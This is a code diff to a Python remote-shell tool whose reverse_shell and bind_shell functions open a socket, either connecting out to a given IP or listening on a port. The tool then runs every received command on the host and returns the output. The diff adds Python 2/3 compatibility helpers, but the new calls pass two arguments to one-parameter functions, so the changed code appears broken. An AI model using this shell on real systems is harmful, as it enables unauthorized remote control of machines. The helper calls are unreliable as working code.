@@ -37,29 +37,41 @@ def easy_chdir(s):
         os.chdir(s)
     except:
         pass
+    
+def to_bytes(s):
+    if sys.version_info[0] < 3:
+        return bytes(s)
+    else:
+        return bytes(s, 'utf-8')
+    
+def to_str(s):
+    if sys.version_info[0] < 3:
+        return str(s)
+    else:
+        return str(s, 'utf-8')
 
 def easy_cmd(conn):
     while 1:
-        conn.send_data(bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# '), 'utf-8'))
-        cmd = str(conn.recive_data(), 'utf-8')
+        conn.send_data(to_bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# '), 'utf-8'))
+        cmd = to_str(conn.recive_data(), 'utf-8')
         if cmd.startswith('cd'):
             easy_chdir(cmd[3:len(cmd) - 1])
         elif cmd == "exit\n":
             conn.close()
             exit()
         else:
-            conn.send_data(bytes(easy_exec(cmd), 'utf-8'))
+            conn.send_data(to_bytes(easy_exec(cmd), 'utf-8'))
 
 def reverse_shell(IP, PORT):
     x = tcp_socket()
     x.connect_to(IP, PORT)
-    x.send_data(bytes('hello from the other side :)\n', 'utf-8'))
+    x.send_data(to_bytes('hello from the other side :)\n', 'utf-8'))
     easy_cmd(x)
 
 def bind_shell(PORT):
     x = tcp_socket()
     x.listen_on(PORT)
-    x.send_data(bytes('hello from the other side :)\n', 'utf-8'))
+    x.send_data(to_bytes('hello from the other side :)\n', 'utf-8'))
     easy_cmd(x)
 
 def default_shell():
